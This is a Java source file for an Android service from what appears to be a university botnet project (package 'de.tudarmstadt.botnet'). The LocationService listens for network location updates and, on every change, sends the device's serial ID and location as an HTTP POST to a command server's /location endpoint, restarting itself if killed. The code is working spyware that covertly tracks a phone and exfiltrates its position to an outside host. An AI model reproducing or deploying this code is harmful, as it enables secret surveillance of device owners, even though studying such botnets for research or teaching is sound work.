package de.tudarmstadt.botnet.janus_yanai;

import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.util.ArrayList;
import java.util.List;

import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.json.JSONException;
import org.json.JSONObject;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Binder;
import android.os.Bundle;
import android.os.IBinder;

public class LocationService extends Service {

	LocationListener locationListener;
	
	@Override
	public void onCreate() {

		// Acquire a reference to the system Location Manager
		LocationManager locationManager = (LocationManager) LocationService.this.getSystemService(Context.LOCATION_SERVICE);

		// Define a listener that responds to location updates
		locationListener = new LocationListener() {
		    public void onLocationChanged(Location location) {
		      
			    HttpClient httpclient = new DefaultHttpClient();
			    HttpPost httppost = new HttpPost("http://" + BotClientActivity.getIP(LocationService.this) + "/location");

			    List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>();
			    nameValuePairs.add(new BasicNameValuePair("serial", Config.getID(LocationService.this)));
			    
			    JSONObject obj;
			    
			    try {
			    	obj = ServerService.getJSONLocation(location);
			    } catch (JSONException e) {
			    	e.printStackTrace();
			    	return;
			    }
			    
			    nameValuePairs.add(new BasicNameValuePair("location", obj.toString()));
			    try {
					httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));
				} catch (UnsupportedEncodingException e) {
					e.printStackTrace();
				}

			    try {
					HttpResponse response = httpclient.execute(httppost);
				} catch (ClientProtocolException e) {
					e.printStackTrace();
				} catch (IOException e) {
					e.printStackTrace();
				}

		    }

		    public void onStatusChanged(String provider, int status, Bundle extras) {}

		    public void onProviderEnabled(String provider) {}

		    public void onProviderDisabled(String provider) {}
		  };

		// Register the listener with the Location Manager to receive location updates
		locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 0, 0, locationListener);

	}
	
    public class LocalBinder extends Binder {
    	LocationService getService() {
            return LocationService.this;
        }
    }
	
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
    	
    }
    
    @Override
    public IBinder onBind(Intent intent) {
        return mBinder;
    }

    private final IBinder mBinder = new LocalBinder();

}
